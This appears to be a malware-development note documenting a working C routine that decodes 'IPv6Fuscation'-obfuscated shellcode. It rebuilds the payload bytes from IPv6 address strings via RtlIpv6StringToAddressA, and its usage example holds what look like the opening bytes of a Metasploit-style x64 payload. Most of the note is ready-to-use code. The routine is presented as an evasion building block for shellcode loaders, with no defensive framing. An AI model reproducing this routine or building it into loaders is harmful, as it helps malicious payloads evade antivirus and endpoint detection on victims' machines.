## Shellcode IPv6Fuscation Deobfuscation

Converts an array of IPv6 address strings back into the original shellcode byte buffer using the NTAPI `RtlIpv6StringToAddressA`. Each IPv6 address is resolved into 16 bytes, and all resolved bytes are written sequentially into a heap-allocated output buffer. The number of elements in the array multiplied by 16 gives the recovered shellcode size.

**Usage**

Call `Ipv6Deobfuscation` with the IPv6 string array, its element count, and two `OUT` pointers that receive the deobfuscated shellcode buffer and its size. The output buffer is heap-allocated by the function; the caller is responsible for freeing it with `HeapFree`.

- `IN CHAR* Ipv6Array[]`  Array of IPv6 address strings produced by `GenerateIpv6Output`.
- `IN SIZE_T NmbrOfElements`  Number of IPv6 address strings in `Ipv6Array`.
- `OUT PBYTE* ppDAddress`  Receives the base address of the heap-allocated deobfuscated shellcode buffer.
- `OUT SIZE_T* pDSize`  Receives the size of the deobfuscated shellcode buffer in bytes (`NmbrOfElements * 16`).

**Return Value**

`BOOL`  Returns `TRUE` if deobfuscation succeeds and `ppDAddress` / `pDSize` are populated, otherwise `FALSE`.

**External Files**

- `windows.h`  `PBYTE`, `PCSTR`, `BOOL`, `SIZE_T`, `NTSTATUS`, `NTAPI`, `IN`, `OUT`, `GetProcAddress()`, `GetModuleHandle()`, `HeapAlloc()`, `GetProcessHeap()`, `GetLastError()`
- `stdio.h`  `printf()`

### Code

```c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR   S,          // The IPv6 address string to convert.
    PCSTR*  Terminator, // Receives a pointer to the character that terminated the scan.
    PVOID   Addr        // Output: receives the 16-byte binary IPv6 address.
);


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize)
{
    PBYTE    pBuffer    = NULL,
             TmpBuffer  = NULL;
    SIZE_T   sBuffSize  = NULL;
    PCSTR    Terminator = NULL;
    NTSTATUS STATUS     = NULL;

    // Resolve RtlIpv6StringToAddressA from ntdll.dll at runtime.
    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(
        GetModuleHandle(TEXT("NTDLL")),     // ntdll.dll is always loaded in every process.
        "RtlIpv6StringToAddressA"           // Converts an IPv6 string to a 16-byte binary address.
    );
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Each IPv6 address deobfuscates to exactly 16 bytes.
    sBuffSize = NmbrOfElements * 16;

    pBuffer = (PBYTE)HeapAlloc(
        GetProcessHeap(),   // Use the process default heap.
        0,                  // No flags.
        sBuffSize           // Total size of the recovered shellcode.
    );
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // TmpBuffer walks forward through pBuffer by 16 bytes per iteration.
    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscate one IPv6 address string into 16 bytes written at TmpBuffer.
        if ((STATUS = pRtlIpv6StringToAddressA(
            Ipv6Array[i],   // Single IPv6 string from the obfuscated array.
            &Terminator,    // Receives pointer to the first character past the address.
            TmpBuffer       // Output: 16 deobfuscated bytes written here.
        )) != 0x0) {
            printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // Advance the write cursor by 16 bytes to avoid overwriting recovered bytes.
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}
```

**Example**

```c
// Array produced by the Obfuscation note — 1 IPv6 string = 16 recovered bytes.
CHAR*  Ipv6Array[]      = { "FC48:83E4:F0E5:E250:4151:5253:5657:5553" };
SIZE_T NmbrOfElements  = sizeof(Ipv6Array) / sizeof(Ipv6Array[0]);

PBYTE  pDAddress = NULL;
SIZE_T pDSize     = 0;

// Recover the original shellcode into a heap-allocated buffer.
if (Ipv6Deobfuscation(Ipv6Array, NmbrOfElements, &pDAddress, &pDSize)) {
    HeapFree(GetProcessHeap(), 0, pDAddress);  // Caller frees.
}
```
